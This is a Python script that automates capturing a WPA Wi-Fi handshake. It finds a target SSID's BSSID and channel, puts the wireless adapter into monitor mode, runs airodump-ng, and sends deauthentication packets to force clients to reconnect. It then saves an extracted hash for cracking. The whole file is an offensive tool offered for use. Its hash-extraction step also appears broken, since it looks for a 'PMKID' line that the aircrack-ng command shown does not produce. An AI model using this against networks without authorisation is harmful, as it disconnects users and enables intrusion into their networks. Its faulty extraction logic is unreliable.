import os
import time
import re
import subprocess
import sys

HANDSHAKE_FILE = "handshake.cap"
HASH_FILE = "handshake.txt"

def get_network_details(ssid):
    """Scans and retrieves BSSID and channel of the selected network."""
    networks = os.popen("sudo iwlist wlan0 scan").read()
    match = re.search(rf'Cell .*?\n.*?Address: ([\w:]+).*?\n.*?Channel (\d+).*?\n.*?ESSID:"{ssid}"', networks, re.DOTALL)
    if match:
        bssid = match.group(1)
        channel = match.group(2)
        return bssid, channel
    else:
        return None, None

def capture_handshake(ssid):
    """Captures WPA handshake and extracts hash."""
    bssid, channel = get_network_details(ssid)
    if not bssid:
        print(f"[-] Network '{ssid}' not found.")
        return

    print(f"[*] Capturing handshake for {ssid} (BSSID: {bssid}, Channel: {channel})")

    # Set Wi-Fi adapter to monitor mode
    os.system("sudo ifconfig wlan0 down")
    os.system("sudo iwconfig wlan0 mode monitor")
    os.system("sudo ifconfig wlan0 up")

    # Start capturing packets and deauth target to force handshake
    capture_command = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {HANDSHAKE_FILE} wlan0"
    deauth_command = f"sudo aireplay-ng --deauth 10 -a {bssid} wlan0"

    try:
        # Start handshake capture
        proc = subprocess.Popen(capture_command, shell=True)
        time.sleep(10)  # Let it capture packets

        # Send deauth packets to speed up handshake capture
        os.system(deauth_command)
        time.sleep(5)

        # Stop capture
        proc.terminate()
        os.system("sudo pkill airodump-ng")

        print("[+] Handshake captured! Extracting hash...")

        # Extract hash from the .cap file
        extract_hash(ssid)
    except Exception as e:
        print(f"[-] Error during handshake capture: {e}")

def extract_hash(ssid):
    """Extracts the hash from handshake capture and saves it."""
    hash_output = os.popen(f"sudo aircrack-ng -J {HANDSHAKE_FILE} {HANDSHAKE_FILE}-01.cap").read()
    match = re.search(r'PMKID: ([\w]+)', hash_output)

    if match:
        handshake_hash = match.group(1)
        with open(HASH_FILE, "w") as file:
            file.write(handshake_hash)
        print(f"[+] Handshake hash saved in {HASH_FILE}")
    else:
        print("[-] No handshake hash extracted.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("[-] Usage: python3 capture.py <SSID>")
        sys.exit(1)

    selected_ssid = sys.argv[1]
    capture_handshake(selected_ssid)
